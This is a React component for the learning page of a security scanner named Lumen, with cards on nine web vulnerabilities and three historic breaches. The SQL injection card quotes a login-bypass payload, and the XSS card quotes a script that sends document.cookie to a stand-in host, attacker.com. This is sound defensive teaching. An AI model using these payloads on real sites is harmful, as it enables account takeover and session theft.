import React, { useEffect, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';

/**
 * Learning page for Lumen.
 *
 * The goal is to stay simple and clean: no emojis, no heavy gradients,
 * just clear cards that explain each vulnerability in plain language.
 */
export default function Vulnerabilities() {
  const [expandedCard, setExpandedCard] = useState(null);
  const [activeTab, setActiveTab] = useState('vulnerabilities');
  const location = useLocation();

  const vulnerabilities = [
    {
      id: 1,
      slug: 'sqli',
      name: 'SQL Injection',
      severity: 'Critical',
      shortDesc: 'Untrusted input is turned into raw SQL and executed by the database.',
      humanDesc:
        'SQL injection lets an attacker change the meaning of a database query by injecting special characters or SQL keywords into fields such as login forms and search boxes.',
      realExample:
        'A login form builds SQL like `SELECT * FROM users WHERE email = \'' +
        'input' +
        '\' AND password = \'input\'` instead of using parameters. The payload \' OR 1=1 -- logs in as the first user.',
      prevention:
        'Use parameterised queries / prepared statements, never concatenate user input into SQL, and apply server-side input validation.'
    },
    {
      id: 2,
      slug: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      severity: 'High',
      shortDesc: 'Attacker-controlled JavaScript is executed in other users’ browsers.',
      humanDesc:
        'XSS occurs when untrusted data is echoed into HTML without proper encoding. It allows attackers to run scripts in a victim’s browser, often to steal cookies or hijack sessions.',
      realExample:
        'A comment field allows raw HTML. An attacker posts `<script>fetch("https://attacker.com/cookie?c=" + document.cookie)</script>` which runs for anyone viewing the comments.',
      prevention:
        'Encode untrusted data before rendering, sanitise user input, and consider a strict Content-Security-Policy to limit where scripts can load from.'
    },
    {
      id: 3,
      slug: 'access_control',
      name: 'Broken Access Control',
      severity: 'Critical',
      shortDesc: 'Users can access data or functions that should be restricted.',
      humanDesc:
        'Broken access control happens when the application does not reliably check whether a user is allowed to access a resource or perform an action, especially when IDs are guessable.',
      realExample:
        'A user profile endpoint at `/api/users/1` is accessible by changing the URL to `/api/users/2`, exposing another user’s data without additional checks.',
      prevention:
        'Enforce authorisation checks on every request, use server-side access control rules, and avoid exposing raw IDs that can be easily enumerated.'
    },
    {
      id: 4,
      slug: 'headers',
      name: 'Missing Security Headers',
      severity: 'Medium',
      shortDesc: 'Important browser security features are disabled by default.',
      humanDesc:
        'Modern browsers rely on HTTP headers such as Content-Security-Policy, X-Frame-Options, X-Content-Type-Options and Strict-Transport-Security to enable defence-in-depth at the browser level.',
      realExample:
        'An application served over HTTPS omits HSTS and CSP. A network attacker can downgrade users to HTTP and inject scripts that would have been blocked with stricter headers.',
      prevention:
        'Configure standard security headers at your reverse proxy or application server. Start with conservative defaults and tighten them as you test.'
    },
    {
      id: 5,
      slug: 'cookies',
      name: 'Insecure Session Cookies',
      severity: 'High',
      shortDesc: 'Session identifiers can be read or sent over insecure channels.',
      humanDesc:
        'If session cookies are missing HttpOnly, Secure or SameSite protections, they can be read by injected scripts or sent over unencrypted connections, increasing the impact of other bugs.',
      realExample:
        'A `sessionid` cookie is set without HttpOnly or Secure. A simple XSS bug can then read the cookie and send it to an attacker, who replays it to hijack the account.',
      prevention:
        'Mark session cookies as HttpOnly and Secure, choose an appropriate SameSite mode, and never expose session identifiers to client-side JavaScript unless strictly necessary.'
    },
    {
      id: 6,
      slug: 'error',
      name: 'Verbose Error Messages',
      severity: 'Medium',
      shortDesc: 'Stack traces and internal details are shown to end users.',
      humanDesc:
        'Detailed error messages can reveal framework versions, file paths and SQL fragments. Attackers use this information to fine-tune payloads and exploit chains.',
      realExample:
        'A bad request causes the application to render a full stack trace including internal function names and SQL queries on the public site.',
      prevention:
        'Return generic error messages to the browser, log detailed information server-side, and ensure production builds do not enable debug error pages.'
    },
    {
      id: 7,
      slug: 'rate_limit',
      name: 'Missing Rate Limiting',
      severity: 'Medium',
      shortDesc: 'Sensitive endpoints accept unlimited repeated attempts.',
      humanDesc:
        'Without any throttling or rate limiting, attackers can send thousands of login attempts or password reset requests without triggering alerts or controls.',
      realExample:
        'A login endpoint returns generic “Invalid credentials” but allows unlimited requests from the same IP, making brute-force attacks easier.',
      prevention:
        'Introduce rate limiting or throttling for endpoints such as login, registration and password reset. Monitor for unusual patterns and add captchas only where necessary.'
    },
    {
      id: 8,
      slug: 'subdomain',
      name: 'Exposed Subdomains',
      severity: 'Low',
      shortDesc: 'Forgotten test or staging systems are still reachable on the internet.',
      humanDesc:
        'Subdomains like dev, test or staging often host older builds with weaker controls. If they are left exposed, attackers can target them to pivot into production.',
      realExample:
        'A `dev.example.com` host is indexed by search engines and runs an outdated version of the application with verbose errors and default credentials.',
      prevention:
        'Maintain an inventory of subdomains, retire or lock down anything that is not meant to be public, and avoid reusing production data on test instances.'
    },
    {
      id: 9,
      slug: 'logging',
      name: 'Insufficient Logging & Monitoring',
      severity: 'Low',
      shortDesc: 'Incidents go unnoticed because there is no visibility.',
      humanDesc:
        'If authentication failures, access control violations and key configuration changes are not logged and reviewed, attacks can succeed quietly and persist over time.',
      realExample:
        'An attacker spends days guessing passwords. Because failed logins are not logged centrally and no alerts are configured, the behaviour is never reviewed.',
      prevention:
        'Log security-relevant events, send them to a central location, and define alerts for patterns such as high failure rates or access from unusual locations.'
    }
  ];

  const breaches = [
    {
      name: 'Equifax (2017)',
      affected: '147M users',
      type: 'Injection & Unpatched Software',
      impact: '$700M+ fines and remediation',
      description:
        'Sensitive personal data was exposed after attackers exploited an unpatched component and moved laterally inside the network.'
    },
    {
      name: 'Yahoo (2013–2014)',
      affected: '3B accounts',
      type: 'Weak Authentication & Monitoring',
      impact: 'Significant valuation impact',
      description:
        'Passwords and personal details were exposed at massive scale, and the breaches went undetected for a long period.'
    },
    {
      name: 'Target (2013)',
      affected: '40M payment cards',
      type: 'Supply Chain & Network Intrusion',
      impact: '$160M+ in direct costs',
      description:
        'Attackers compromised a third-party vendor and installed point-of-sale malware, capturing card data during peak shopping season.'
    }
  ];

  const toggleCard = (id) => setExpandedCard(expandedCard === id ? null : id);

  // When navigated to /learn#slug, expand the matching card and scroll it into view.
  useEffect(() => {
    if (!location.hash) return;
    const hash = location.hash.replace('#', '');
    const match = vulnerabilities.find((v) => v.slug === hash);
    if (!match) return;
    setExpandedCard(match.id);
    const el = document.getElementById(match.slug);
    if (el) {
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }, [location.hash]);

  const severityBadge = (sev) => {
    const base = 'inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium';
    if (sev === 'Critical') return `${base} bg-red-100 text-red-700`;
    if (sev === 'High') return `${base} bg-orange-100 text-orange-700`;
    if (sev === 'Medium') return `${base} bg-amber-100 text-amber-700`;
    return `${base} bg-gray-100 text-gray-700`;
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
      {/* Header */}
      <div className="mb-8 flex flex-col md:flex-row md:items-end md:justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold text-dark-800">Learning centre</h1>
          <p className="text-sm text-gray-600 mt-2">
            Short, practical explanations of common web vulnerabilities and major real-world breaches.
          </p>
        </div>
        <div className="flex flex-wrap gap-2">
          <button
            onClick={() => setActiveTab('vulnerabilities')}
            className={`px-3 py-1.5 rounded-full text-sm ${
              activeTab === 'vulnerabilities'
                ? 'bg-primary-600 text-white'
                : 'bg-white border border-gray-200 text-gray-700'
            }`}
          >
            Vulnerabilities
          </button>
          <button
            onClick={() => setActiveTab('breaches')}
            className={`px-3 py-1.5 rounded-full text-sm ${
              activeTab === 'breaches'
                ? 'bg-primary-600 text-white'
                : 'bg-white border border-gray-200 text-gray-700'
            }`}
          >
            Historic breaches
          </button>
          <Link
            to="/new"
            className="px-3 py-1.5 rounded-full text-sm bg-dark-800 text-white hover:bg-dark-700"
          >
            Start a scan
          </Link>
        </div>
      </div>

      {activeTab === 'vulnerabilities' && (
        <div className="space-y-4">
          <div className="card">
            <div className="card-body">
              <h2 className="text-lg font-semibold mb-1">Common web vulnerabilities</h2>
              <p className="text-sm text-gray-600">
                These cards are designed to be quick to read. Click any item to see how the issue works in practice and what you can do to
                reduce the risk in your own applications.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {vulnerabilities.map((v) => (
              <article
                key={v.id}
                id={v.slug}
                className="card cursor-pointer transition-transform duration-200 hover:-translate-y-0.5"
                onClick={() => toggleCard(v.id)}
              >
                <header className="card-header flex items-start justify-between">
                  <div>
                    <h3 className="text-sm font-semibold text-dark-800">{v.name}</h3>
                    <p className="mt-1 text-xs text-gray-500 italic">{v.shortDesc}</p>
                  </div>
                  <span className={severityBadge(v.severity)}>{v.severity}</span>
                </header>
                {expandedCard === v.id && (
                  <div className="card-body border-t border-gray-100">
                    <div className="space-y-3 text-sm">
                      <Section title="How it works">{v.humanDesc}</Section>
                      <Section title="Real example">{v.realExample}</Section>
                      <Section title="How to reduce the risk">{v.prevention}</Section>
                    </div>
                  </div>
                )}
              </article>
            ))}
          </div>
        </div>
      )}

      {activeTab === 'breaches' && (
        <div className="space-y-4">
          <div className="card">
            <div className="card-body">
              <h2 className="text-lg font-semibold mb-1">Security incidents in the real world</h2>
              <p className="text-sm text-gray-600">
                Large breaches often come down to the same patterns you see in smaller applications: missing patches, weak access control,
                and limited monitoring.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {breaches.map((b, i) => (
              <article key={i} className="card h-full">
                <div className="card-body flex flex-col justify-between">
                  <div>
                    <h3 className="text-sm font-semibold text-dark-800">{b.name}</h3>
                    <p className="mt-1 text-xs text-gray-500">
                      {b.affected} • {b.impact}
                    </p>
                    <p className="mt-2 text-sm text-gray-600">{b.description}</p>
                  </div>
                  <div className="mt-3">
                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-gray-100 text-gray-700">
                      {b.type}
                    </span>
                  </div>
                </div>
              </article>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function Section({ title, children }) {
  return (
    <section>
      <h4 className="text-xs font-semibold text-gray-700 mb-1">{title}</h4>
      <p className="text-sm text-gray-700 italic">{children}</p>
    </section>
  );
}